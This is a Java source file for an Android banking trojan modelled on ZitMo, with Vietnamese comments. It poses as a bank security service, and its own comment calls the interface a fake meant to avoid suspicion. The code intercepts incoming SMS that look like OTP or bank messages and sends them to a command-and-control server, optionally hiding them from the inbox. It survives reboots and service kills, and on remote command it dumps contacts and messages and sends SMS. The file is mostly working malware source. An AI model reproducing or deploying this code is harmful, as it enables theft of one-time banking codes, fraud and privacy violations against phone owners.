package com.research.banking;

import android.Manifest;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MainActivity - Giao diện giả mạo phần mềm ngân hàng để người dùng không nghi ngờ
 */
public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.WAKE_LOCK
    };

    // Yêu cầu quyền bổ sung cho Android 11+
    private static final String[] ADDITIONAL_PERMISSIONS_ANDROID_11 = {
            Manifest.permission.READ_PHONE_NUMBERS
    };

    private TextView statusTextView;
    private Button activateButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Khởi tạo các view
        statusTextView = findViewById(R.id.status_text);
        activateButton = findViewById(R.id.activate_button);

        // Thiết lập nút kích hoạt
        activateButton.setOnClickListener(v -> requestPermissions());

        // Kiểm tra và yêu cầu quyền nếu chưa có
        if (hasAllPermissions()) {
            startZitmoService();
            updateUI(true);
        } else {
            updateUI(false);
        }
    }

    private void updateUI(boolean isActive) {
        if (isActive) {
            statusTextView.setText("Dịch vụ bảo mật ngân hàng đang hoạt động");
            activateButton.setText("Đã kích hoạt");
            activateButton.setEnabled(false);
        } else {
            statusTextView.setText("Dịch vụ bảo mật ngân hàng chưa được kích hoạt");
            activateButton.setText("Kích hoạt ngay");
            activateButton.setEnabled(true);
        }
    }

    private boolean hasAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }

        // Kiểm tra quyền bổ sung cho Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            for (String permission : ADDITIONAL_PERMISSIONS_ANDROID_11) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }

        return true;
    }

    private void requestPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();

        // Thêm các quyền cơ bản còn thiếu
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        // Thêm quyền bổ sung cho Android 11+ nếu cần
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            for (String permission : ADDITIONAL_PERMISSIONS_ANDROID_11) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                    permissionsToRequest.toArray(new String[0]), 
                    PERMISSION_REQUEST_CODE);
        } else {
            startZitmoService();
            updateUI(true);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                startZitmoService();
                updateUI(true);
                Toast.makeText(this, "Dịch vụ bảo mật ngân hàng đã được kích hoạt", Toast.LENGTH_SHORT).show();
            } else {
                new AlertDialog.Builder(this)
                        .setTitle("Cần cấp quyền")
                        .setMessage("Để bảo vệ tài khoản ngân hàng của bạn, ứng dụng cần tất cả các quyền được yêu cầu. Vui lòng cấp tất cả quyền.")
                        .setPositiveButton("Thử lại", (dialog, which) -> requestPermissions())
                        .setNegativeButton("Không phải bây giờ", (dialog, which) -> dialog.dismiss())
                        .create()
                        .show();
            }
        }
    }

    private void startZitmoService() {
        // Khởi động service
        Intent serviceIntent = new Intent(this, ZitmoService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
}

/**
 * SMSReceiver - Chặn và xử lý tin nhắn SMS đến
 */
class SMSReceiver extends BroadcastReceiver {
    private static final String TAG = "SMSReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String message = smsMessage.getDisplayMessageBody();

                        Log.d(TAG, "SMS nhận từ: " + sender + ", Nội dung: " + message);

                        // Kiểm tra xem tin nhắn có chứa mTAN hoặc nội dung nhạy cảm không
                        if (containsSensitiveContent(message)) {
                            // Gửi SMS bị chặn đến máy chủ C&C
                            sendInterceptedSMS(context, sender, message);
                            
                            // Có thể chặn tin nhắn này không hiển thị trong hộp thư đến
                            if (ZitmoUtils.isHideSMSEnabled(context)) {
                                abortBroadcast();
                            }
                        }
                    }
                }
            }
        }
    }

    private boolean containsSensitiveContent(String message) {
        // Các từ khóa có thể liên quan đến mTAN hoặc giao dịch ngân hàng
        String[] keywords = {
                "mã xác thực", "otp", "mã otp", "mã giao dịch", "mã bảo mật", 
                "verification code", "security code", "authentication code",
                "mtan", "one-time password", "chuyển khoản", "tài khoản", 
                "ngân hàng", "bank", "banking", "account", "transfer"
        };

        String messageLower = message.toLowerCase();
        
        // Kiểm tra từ khóa
        for (String keyword : keywords) {
            if (messageLower.contains(keyword.toLowerCase())) {
                return true;
            }
        }

        // Kiểm tra mẫu số (4-8 chữ số liên tiếp - thường là mã OTP)
        Pattern pattern = Pattern.compile("\\b\\d{4,8}\\b");
        Matcher matcher = pattern.matcher(message);
        
        return matcher.find();
    }

    private void sendInterceptedSMS(Context context, String sender, String message) {
        ExecutorService executor = Executors.newSingleThreadExecutor();
        executor.execute(() -> {
            try {
                String deviceId = ZitmoUtils.getDeviceId(context);
                String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());

                JSONObject jsonPayload = new JSONObject();
                jsonPayload.put("device_id", deviceId);
                jsonPayload.put("sender", sender);
                jsonPayload.put("message", message);
                jsonPayload.put("timestamp", timestamp);

                URL url = new URL(ZitmoUtils.getServerUrl(context) + "/intercepted_sms");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);
                connection.setConnectTimeout(10000);

                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = jsonPayload.toString().getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                int responseCode = connection.getResponseCode();
                if (responseCode >= 200 && responseCode < 300) {
                    Log.d(TAG, "SMS bị chặn đã được gửi thành công đến máy chủ C&C");
                } else {
                    Log.e(TAG, "Lỗi khi gửi SMS bị chặn: HTTP " + responseCode);
                }

                connection.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Lỗi khi gửi SMS bị chặn: " + e.getMessage());
            }
        });
        executor.shutdown();
    }
}

/**
 * BootReceiver - Tự khởi động khi thiết bị khởi động
 */
class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && 
                (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED) || 
                 intent.getAction().equals(Intent.ACTION_MY_PACKAGE_REPLACED))) {
            // Khởi động service
            Intent serviceIntent = new Intent(context, ZitmoService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}

/**
 * ZitmoService - Dịch vụ chính chạy trong nền
 */
class ZitmoService extends Service {
    private static final String TAG = "ZitmoService";
    private static final String CHANNEL_ID = "ZitmoServiceChannel";
    private static final int NOTIFICATION_ID = 1337;
    private static final int PING_INTERVAL = 15 * 60 * 1000; // 15 phút

    private Handler handler;
    private PowerManager.WakeLock wakeLock;
    private ExecutorService executor;
    private boolean isRegistered = false;
    private BroadcastReceiver smsReceiver;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "ZitmoService đã được tạo");

        // Khởi tạo handler cho các tác vụ lặp lại
        handler = new Handler();
        
        // Khởi tạo thread pool cho các tác vụ mạng
        executor = Executors.newCachedThreadPool();

        // Đăng ký BroadcastReceiver để nghe SMS
        smsReceiver = new SMSReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        filter.setPriority(999); // Ưu tiên cao để chặn SMS trước các ứng dụng khác
        registerReceiver(smsReceiver, filter);

        // Khởi tạo WakeLock để giữ service hoạt động khi máy ngủ
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                "Zitmo:WakeLockTag");
        wakeLock.acquire();

        // Khởi tạo notification channel nếu cần (Android 8.0+)
        createNotificationChannel();
        
        // Chuyển thành dịch vụ foreground để tránh bị kill
        startForeground(NOTIFICATION_ID, createNotification());

        // Đăng ký thiết bị với máy chủ C&C
        registerDevice();

        // Bắt đầu ping định kỳ
        startPingScheduler();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Dịch vụ bảo mật ngân hàng",
                    NotificationManager.IMPORTANCE_LOW
            );
            serviceChannel.setDescription("Dịch vụ bảo vệ giao dịch ngân hàng của bạn");
            serviceChannel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Dịch vụ bảo mật ngân hàng")
                .setContentText("Đang bảo vệ giao dịch của bạn")
                .setSmallIcon(R.drawable.ic_secure)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .build();
    }

    private void registerDevice() {
        executor.execute(() -> {
            try {
                String deviceId = ZitmoUtils.getDeviceId(this);
                String deviceInfo = ZitmoUtils.getDeviceInfo(this);
                String phoneNumber = ZitmoUtils.getPhoneNumber(this);
                String operator = ZitmoUtils.getMobileOperator(this);

                JSONObject jsonPayload = new JSONObject();
                jsonPayload.put("device_id", deviceId);
                jsonPayload.put("device_info", deviceInfo);
                jsonPayload.put("phone_number", phoneNumber);
                jsonPayload.put("operator", operator);

                URL url = new URL(ZitmoUtils.getServerUrl(this) + "/register");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);
                connection.setConnectTimeout(10000);

                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = jsonPayload.toString().getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                int responseCode = connection.getResponseCode();
                if (responseCode >= 200 && responseCode < 300) {
                    // Đọc phản hồi
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }

                    JSONObject jsonResponse = new JSONObject(response.toString());
                    
                    if (jsonResponse.getString("status").equals("success")) {
                        isRegistered = true;
                        Log.d(TAG, "Đăng ký thiết bị thành công");
                        
                        // Xử lý lệnh đang chờ (nếu có)
                        if (jsonResponse.has("pending_commands")) {
                            JSONArray pendingCommands = jsonResponse.getJSONArray("pending_commands");
                            processCommands(pendingCommands);
                        }
                    }
                } else {
                    Log.e(TAG, "Lỗi khi đăng ký thiết bị: HTTP " + responseCode);
                }

                connection.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Lỗi khi đăng ký thiết bị: " + e.getMessage());
            }
        });
    }

    private void startPingScheduler() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                pingServer();
                handler.postDelayed(this, PING_INTERVAL);
            }
        }, PING_INTERVAL);
    }

    private void pingServer() {
        executor.execute(() -> {
            try {
                String deviceId = ZitmoUtils.getDeviceId(this);

                JSONObject jsonPayload = new JSONObject();
                jsonPayload.put("device_id", deviceId);

                URL url = new URL(ZitmoUtils.getServerUrl(this) + "/ping");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);
                connection.setConnectTimeout(10000);

                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = jsonPayload.toString().getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                int responseCode = connection.getResponseCode();
                if (responseCode >= 200 && responseCode < 300) {
                    // Đọc phản hồi
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }

                    JSONObject jsonResponse = new JSONObject(response.toString());
                    
                    if (jsonResponse.getString("status").equals("success")) {
                        Log.d(TAG, "Ping thành công");
                        
                        // Xử lý lệnh đang chờ (nếu có)
                        if (jsonResponse.has("pending_commands")) {
                            JSONArray pendingCommands = jsonResponse.getJSONArray("pending_commands");
                            processCommands(pendingCommands);
                        }
                    }
                } else {
                    Log.e(TAG, "Lỗi khi ping: HTTP " + responseCode);
                }

                connection.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Lỗi khi ping: " + e.getMessage());
            }
        });
    }

    private void processCommands(JSONArray commands) throws JSONException {
        for (int i = 0; i < commands.length(); i++) {
            JSONObject command = commands.getJSONObject(i);
            int commandId = command.getInt("id");
            String commandType = command.getString("type");
            String commandData = command.getString("data");
            
            executeCommand(commandId, commandType, commandData);
        }
    }

    private void executeCommand(int commandId, String commandType, String commandData) {
        executor.execute(() -> {
            String result = "";
            
            try {
                JSONObject dataJson = new JSONObject(commandData);
                
                switch (commandType) {
                    case "get_contacts":
                        result = getContacts();
                        break;
                        
                    case "get_sms":
                        int limit = dataJson.optInt("limit", 100);
                        result = getSmsMessages(limit);
                        break;
                        
                    case "send_sms":
                        String to = dataJson.getString("to");
                        String message = dataJson.getString("message");
                        result = sendSms(to, message);
                        break;
                        
                    case "update":
                        String updateUrl = dataJson.getString("url");
                        result = updateApp(updateUrl);
                        break;
                        
                    case "uninstall":
                        result = uninstallApp();
                        break;
                        
                    default:
                        result = "Không hỗ trợ loại lệnh: " + commandType;
                        break;
                }
            } catch (JSONException e) {
                result = "Lỗi khi phân tích dữ liệu lệnh: " + e.getMessage();
            }
            
            // Báo cáo kết quả thực thi
            reportCommandExecution(commandId, result);
        });
    }

    private String getContacts() {
        StringBuilder result = new StringBuilder();
        
        try {
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    },
                    null,
                    null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );
            
            if (cursor != null) {
                int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                
                while (cursor.moveToNext()) {
                    String name = cursor.getString(nameIndex);
                    String number = cursor.getString(numberIndex);
                    result.append(name).append(": ").append(number).append("\n");
                }
                
                cursor.close();
            }
        } catch (Exception e) {
            return "Lỗi khi đọc danh bạ: " + e.getMessage();
        }
        
        return result.toString();
    }

    private String getSmsMessages(int limit) {
        StringBuilder result = new StringBuilder();
        
        try {
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(
                    Uri.parse("content://sms/inbox"),
                    new String[]{"address", "body", "date"},
                    null,
                    null,
                    "date DESC LIMIT " + limit
            );
            
            if (cursor != null) {
                int addressIndex = cursor.getColumnIndex("address");
                int bodyIndex = cursor.getColumnIndex("body");
                int dateIndex = cursor.getColumnIndex("date");
                
                while (cursor.moveToNext()) {
                    String address = cursor.getString(addressIndex);
                    String body = cursor.getString(bodyIndex);
                    long dateMillis = cursor.getLong(dateIndex);
                    
                    Date date = new Date(dateMillis);
                    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                    
                    result.append("Từ: ").append(address)
                            .append("\nThời gian: ").append(dateFormat.format(date))
                            .append("\nNội dung: ").append(body)
                            .append("\n--------------------\n");
                }
                
                cursor.close();
            }
        } catch (Exception e) {
            return "Lỗi khi đọc tin nhắn: " + e.getMessage();
        }
        
        return result.toString();
    }

    private String sendSms(String to, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            
            if (message.length() > 160) {
                ArrayList<String> parts = smsManager.divideMessage(message);
                smsManager.sendMultipartTextMessage(to, null, parts, null, null);
            } else {
                smsManager.sendTextMessage(to, null, message, null, null);
            }
            
            return "Đã gửi tin nhắn đến " + to;
        } catch (Exception e) {
            return "Lỗi khi gửi tin nhắn: " + e.getMessage();
        }
    }

    private String updateApp(String updateUrl) {
        // Trong một ứng dụng thực tế, bạn sẽ tải xuống APK mới và cài đặt
        // Đây chỉ là mô phỏng
        return "Đã nhận lệnh cập nhật từ URL: " + updateUrl;
    }

    private String uninstallApp() {
        // Trong một ứng dụng thực tế, bạn có thể xóa dữ liệu và vô hiệu hóa bản thân
        // Đây chỉ là mô phỏng
        return "Đã nhận lệnh gỡ cài đặt";
    }

    private void reportCommandExecution(int commandId, String result) {
        executor.execute(() -> {
            try {
                String deviceId = ZitmoUtils.getDeviceId(this);

                JSONObject jsonPayload = new JSONObject();
                jsonPayload.put("device_id", deviceId);
                jsonPayload.put("command_id", commandId);
                jsonPayload.put("result", result);

                URL url = new URL(ZitmoUtils.getServerUrl(this) + "/command_executed");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);
                connection.setConnectTimeout(10000);

                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = jsonPayload.toString().getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                int responseCode = connection.getResponseCode();
                if (responseCode >= 200 && responseCode < 300) {
                    Log.d(TAG, "Báo cáo thực thi lệnh thành công");
                } else {
                    Log.e(TAG, "Lỗi khi báo cáo thực thi lệnh: HTTP " + responseCode);
                }

                connection.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Lỗi khi báo cáo thực thi lệnh: " + e.getMessage());
            }
        });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "ZitmoService đã được khởi động");
        
        // Đảm bảo service sẽ được khởi động lại nếu bị kill
        setUpRestartAlarm();
        
        return START_STICKY;
    }

    private void setUpRestartAlarm() {
        Intent restartIntent = new Intent(this, ZitmoService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
                this, 1, restartIntent, PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 60000, // 1 phút
                pendingIntent
        );
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "ZitmoService bị hủy, cố gắng khởi động lại");
        
        // Hủy đăng ký BroadcastReceiver
        if (smsReceiver != null) {
            unregisterReceiver(smsReceiver);
        }
        
        // Hủy bỏ WakeLock
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        // Hủy lập lịch ping
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        
        // Tắt thread pool
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
        }
        
        // Khởi động lại service (cố gắng duy trì hoạt động)
        setUpRestartAlarm();
        
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

/**
 * ZitmoUtils - Các phương thức tiện ích
 */
class ZitmoUtils {
    private static final String PREFS_NAME = "ZitmoPrefs";
    private static final String SERVER_URL_DEFAULT = "http://192.168.1.100:5000";
    private static final String DEVICE_ID_KEY = "device_id";
    private static final String SERVER_URL_KEY = "server_url";
    private static final String HIDE_SMS_KEY = "hide_sms";

    // Lấy hoặc tạo ID thiết bị duy nhất
    public static String getDeviceId(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String deviceId = prefs.getString(DEVICE_ID_KEY, null);
        
        if (deviceId == null) {
            // Tạo ID mới
            deviceId = UUID.randomUUID().toString();
            prefs.edit().putString(DEVICE_ID_KEY, deviceId).apply();
        }
        
        return deviceId;
    }

    // Lấy URL máy chủ từ cài đặt
    public static String getServerUrl(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getString(SERVER_URL_KEY, SERVER_URL_DEFAULT);
    }

    // Cài đặt URL máy chủ mới
    public static void setServerUrl(Context context, String url) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit().putString(SERVER_URL_KEY, url).apply();
    }

    // Kiểm tra xem có ẩn SMS không
    public static boolean isHideSMSEnabled(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getBoolean(HIDE_SMS_KEY, true);
    }

    // Cài đặt chế độ ẩn SMS
    public static void setHideSMS(Context context, boolean hide) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit().putBoolean(HIDE_SMS_KEY, hide).apply();
    }

    // Lấy thông tin thiết bị
    public static String getDeviceInfo(Context context) {
        return "Model: " + Build.MODEL + 
               ", Manufacturer: " + Build.MANUFACTURER + 
               ", Android: " + Build.VERSION.RELEASE;
    }

    // Lấy số điện thoại
    public static String getPhoneNumber(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED ||
                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && 
                 ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED)) {
                
                String phoneNumber = telephonyManager.getLine1Number();
                if (phoneNumber != null && !phoneNumber.isEmpty()) {
                    return phoneNumber;
                }
            }
        } catch (Exception e) {
            Log.e("ZitmoUtils", "Lỗi khi lấy số điện thoại: " + e.getMessage());
        }
        
        return "Unknown";
    }

    // Lấy nhà mạng di động
    public static String getMobileOperator(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            String operatorName = telephonyManager.getNetworkOperatorName();
            if (operatorName != null && !operatorName.isEmpty()) {
                return operatorName;
            }
        } catch (Exception e) {
            Log.e("ZitmoUtils", "Lỗi khi lấy nhà mạng: " + e.getMessage());
        }
        
        return "Unknown";
    }
}